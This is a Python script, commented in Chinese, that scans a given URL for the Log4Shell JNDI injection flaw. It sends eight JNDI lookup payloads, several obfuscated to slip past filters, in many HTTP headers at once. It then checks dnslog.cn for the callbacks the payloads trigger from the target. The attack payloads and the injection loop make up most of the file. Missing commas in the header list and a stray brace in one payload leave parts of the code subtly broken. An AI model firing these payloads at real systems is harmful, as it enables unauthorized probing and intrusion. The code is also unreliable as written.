import sys,os
import time
import requests
from threading import Thread
from optparse import OptionParser 



#------------------------------------------------------------------------------------------
# 配置代理：默认关闭
proxy = {
    'http': 'http://127.0.0.1:8080'
}


# 配置注入点：http请求中可能存在问题的请求头
vulns = [
    'X-Client-IP','X-Remote-IP','X-Remote-Addr','X-Forwarded-For',
    'X-Originating-IP','User-Agent','Referer','CF-Connecting_IP',
    'Contact','X-Wap-Profile','X-Api-Version','User-Agent'
    'True-Client-IP','Originating-IP','Forwarded','Client-IP'
    'X-Real-IP','X-Client-IP'
]

# 检测payload：内置8种语句
def payloadList(sub):
    payloads = [
        r'${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://'+ sub +r'/}',
        r'${${::-j}ndi:rmi://'+ sub +'/}',
        r'${jndi:rmi://'+ sub +'/}',
        r'${${lower:jndi}:${lower:rmi}://'+ sub +'/}',
        r'${${lower:${lower:jndi}}:${lower:rmi}://'+ sub +'/}',
        r'${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://'+ sub +'/}',
        r'${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://'+ sub +'/}',
        r'${${lower:jnd}${upper:i}:${lower:ldap}://'+ sub +'/}'
    ]
    return payloads

# 生成可变化headers
def getHeaders(h_key='', h_value=''):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36',
        'Connection': 'close',
        'Accept-Encoding': 'deflate',
    }
    if not h_key:
        return headers
    else:
        headers[h_key] = h_value
    return headers

# 获得dnslog的cookie和subdomain
def getDnslogSubdomain():
    url = 'http://www.dnslog.cn/getdomain.php?t=0.8000782430099618'
    try:
        r = requests.get(url, headers=getHeaders(), timeout=120)#, proxies = proxy)
        subdomain = r.text # xxxxx.dnslog.com
        cookie = r.cookies # PHPSESSID=tuskclggh8nmbh4kcsahvdl2r4
        cookie = requests.utils.dict_from_cookiejar(cookie)
        cookie = "PHPSESSID" + "=" + cookie['PHPSESSID']
        print('[*] 获取subDnslog: {}\n[*] 获得cookie: {}'.format(subdomain, cookie))
        dnslog = [subdomain, cookie]
        return dnslog
    except:
        print('请求错误，无法到达dnslog-getdomain')
        return 0

# 检查dnslog是否收到数据
def checkDnslogRecord(dnslog):
    subdomain = dnslog[0]
    cookie = dnslog[1]
    url = 'http://www.dnslog.cn/getrecords.php?t=0.8000782430099610'

    try:
        r = requests.get(url, headers=getHeaders('Cookie', cookie), timeout=120)#, proxies = proxy)
        if subdomain in r.text:
            print('[+] 发现问题，dnslog收到记录：{}'.format(r.text))
            return 1
        else:
            return 2
    except:
        return 0

# 发送携带payload的请求
def go(vuln, payload, dnslog, url):
    r = requests.get(url, headers=getHeaders(vuln, payload), timeout=120)
    result = checkDnslogRecord(dnslog)
    if result == 1:
        print('[+] 当前payload：{}: {}'.format(vuln, payload))
        #sys.exit()
        os._exit(0)
    elif result == 2:
        print('[-] 当前payload未发现问题：{}: {}'.format(vuln, payload))
    else:
        print('[x] dnslog网络问题，无法到达dnslog-getrecords')

# 处理命令行输入为 "-u" 的情况
def start_url(url):
    thread_list = []
    dnslog = getDnslogSubdomain() # ['185a6p.dnslog.cn', 'PHPSESSID=ip7t5usnetu9gu5bi9jaiigjd0']
    payloads = payloadList(dnslog[0]) # payloadList('185a6p.dnslog.cn')
    #dnslog = ['vn8zf8.dnslog.cn', 'PHPSESSID=qtjb6eatk3dsl9rvs6dcje1rq6']
    #payloads = payloadList('vn8zf8.dnslog.cn')

    for vuln in vulns:
        for payload in payloads:
            time.sleep(0.5)
            thread_01 = Thread(target=go, args=(vuln, payload, dnslog, url,))
            thread_01.start() # 多线程
            thread_list.append(thread_01)
            #go(vuln, payload, dnslog, url) #单线程
    for t in thread_list:
        t.join()
    print('[总结] 全部payload已发出，未发现log4j漏洞')


#------------------------------------------------------------------------------------------
'''
    帮助文档
'''
def parseArgs():
    #usage="python %prog -u <target url> or -f <file path>"
    usage="python %prog -u <target url>"
    parser = OptionParser(usage)
    parser.add_option("-u", "--url", action="store", dest="url",
                    help="输入需要检查的链接，如: https://ainrm.cn")
    return parser.parse_args()

'''
    脚本入口
'''
if __name__ == "__main__":
    options, _ = parseArgs()
    if options.url:
        start_url(options.url)
    elif options.url == None:
        print('Usage: python3 log4j-scan.py -u <target url>')